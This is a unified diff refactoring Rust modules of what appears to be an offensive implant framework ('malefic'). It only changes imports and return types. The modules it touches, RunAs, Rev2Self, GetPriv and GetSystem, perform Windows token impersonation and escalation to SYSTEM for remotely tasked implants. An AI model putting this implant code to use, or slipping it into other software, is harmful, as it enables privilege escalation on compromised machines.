@@ -1,9 +1,5 @@
-use crate::{check_field, check_request, Input, Module, ModuleImpl, Output, Result, TaskResult};
-use malefic_proto::proto::implantpb::{spite::Body};
-use async_trait::async_trait;
 use malefic_proto::proto::implantpb::spite::Body::ExecResponse;
-use malefic_trait::module_impl;
-
+use crate::prelude::*;
 
 pub struct RunAs {}
 
@@ -13,7 +9,7 @@ impl Module for RunAs {}
 
 #[async_trait]
 impl ModuleImpl for RunAs {
-    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> Result {
+    async fn run(&mut self, id: u32, receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let req = check_request!(receiver, Body::RunasRequest)?;
 
         let username = check_field!(req.username)?;
@@ -41,7 +37,7 @@ impl Module for Rev2Self {}
 
 #[async_trait]
 impl ModuleImpl for Rev2Self {
-    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
+    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         malefic_helper::win::token::revert_to_self()?;
         Ok(TaskResult::new(id))
     }
@@ -54,7 +50,7 @@ pub struct GetPriv {}
 impl Module for GetPriv {}
 #[async_trait]
 impl ModuleImpl for GetPriv {
-    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
+    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         let privileges = malefic_helper::win::token::get_privs()?;
 
         let mut response = malefic_proto::proto::modulepb::Response::default();
@@ -76,7 +72,7 @@ impl Module for GetSystem {}
 
 #[async_trait]
 impl ModuleImpl for GetSystem {
-    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> Result {
+    async fn run(&mut self, id: u32, _receiver: &mut Input, _sender: &mut Output) -> ModuleResult {
         // 尝试提升到 SYSTEM 权限
         let _system_token = malefic_helper::win::token::get_system()?;
 
